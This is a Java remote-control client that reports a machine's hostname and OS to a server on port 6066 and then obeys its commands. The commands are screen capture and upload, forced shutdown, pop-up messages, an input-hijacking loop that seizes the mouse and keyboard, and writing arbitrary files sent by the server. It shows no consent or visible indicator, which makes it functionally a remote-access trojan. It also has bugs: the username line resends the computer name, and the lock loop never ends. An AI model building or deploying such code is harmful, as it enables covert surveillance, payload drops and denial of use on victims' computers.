import java.awt.AWTException;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.BufferedImage;
import java.awt.Component.*;
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener.*;
import java.awt.event.KeyEvent;
import java.awt.*;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.*;

import java.lang.Thread;
import javax.imageio.ImageIO;
import javax.imageio.*;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;

import java.nio.ByteBuffer;
import java.lang.*;
import javax.swing.JOptionPane;
import java.net.InetAddress;

public class Client
{
	final int port = 6066;
	Image newimg;
	byte[] bytes;
	DataOutputStream out;
	DataInputStream in;
	BufferedReader br = null;
	PrintWriter printWriter;
	Socket socket = null;
	Robot robo; 
	
	public Client(String serverName)
	{
		try 
		{
			socket = new Socket(serverName, port);
			br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			out = new DataOutputStream(socket.getOutputStream());
			robo = new Robot();
		}
		catch (UnknownHostException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		catch (IOException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		} 
		catch (AWTException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void connection() throws IOException
	{
		//System.out.println("Client Started");
		try
		{
			int task = 1;
			String computerName;
			String userName;
			String osName;
			String osVersion;
			printWriter = new PrintWriter(socket.getOutputStream());
			try
			{
				computerName = InetAddress.getLocalHost().getHostName();
				printWriter.println(new String(""+computerName));
				printWriter.flush();
				
				userName = System.getProperty("user.name");
				printWriter.println(new String(""+computerName));
				printWriter.flush();
				
				osName = System.getProperty("os.name");
				printWriter.println(new String(""+osName));
				printWriter.flush();
				
				osVersion= System.getProperty("os.version");
				printWriter.println(new String(""+osVersion));
				printWriter.flush();
				
			}
			catch(Exception e)
			{
				System.out.println(e);
			}
			
			while (true) 
			{
				String string = br.readLine();
				task = Integer.parseInt(string);
				
				switch(task)
				{
					case 1: //sends screenshot
							
							Robot robot = new Robot();
							BufferedImage bimg = robot.createScreenCapture(new Rectangle(
									Toolkit.getDefaultToolkit().getScreenSize()));
							ByteArrayOutputStream imgStream = new ByteArrayOutputStream();
							imgStream.flush();
							ImageIO.write(bimg, "jpeg", imgStream);
							// System.out.println("Image Size jpeg: " + imgStream.size());
							out.writeInt(imgStream.size());
							imgStream.writeTo(out);
							
							break;
					
					case 2: //shutdown machine
					
							try 
							{
								Runtime shutdown = Runtime.getRuntime();
								shutdown.exec("shutdown -s -f");
							}
							catch (Exception ex)
							{
								System.out.println("Unable to Shutdown Machine.");
							}
							
							break;
				
					case 3: //Single line message
							
							JOptionPane.showMessageDialog(null, br.readLine(),
								"Message", JOptionPane.WARNING_MESSAGE);
							
							break;
					
					case 4:	//blocking client
							
							Robot robot1 = new Robot();
							while(true)
							{
								if(task == 1 || task == 5)
								{	
									break;
								}
								robot1.mouseMove(300,300);
								robot1.keyPress(65);
							}
													
							break;
					
					case 5:	//do nothing
					
					case 6:	//do nothing
							break;
					
					case 7:	//file sharing
							String fileName = br.readLine();
							if (fileName.equals("___999"))
							{
								// do nothing
							} 
							else
							{
								File outputFile = new File(fileName);
								FileOutputStream outs = new FileOutputStream(outputFile);
								int c;
								while ((c = Integer.parseInt(br.readLine())) != -1)
								{
									outs.write(c);
								}
								//JOptionPane.showMessageDialog(null,"New File Recieved");
								outs.close();
							}
							break;
				}
				Thread.sleep(25);
			}
		}
		catch (Exception e)
		{
			e.printStackTrace();
			try
			{
				socket.close();
			}
			catch (IOException ioe)
			{
				ioe.printStackTrace();
			}
		}

	}
	
	public static void main(String[] args)
	{

		String serverName;
		
		if(args.length == 0)
		{
			serverName= "127.0.0.1";
		}
		else
		{
			serverName = args[0];
		}
		
		Client client = new Client(serverName);
		
		try 
		{
			client.connection();
		} 
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}
}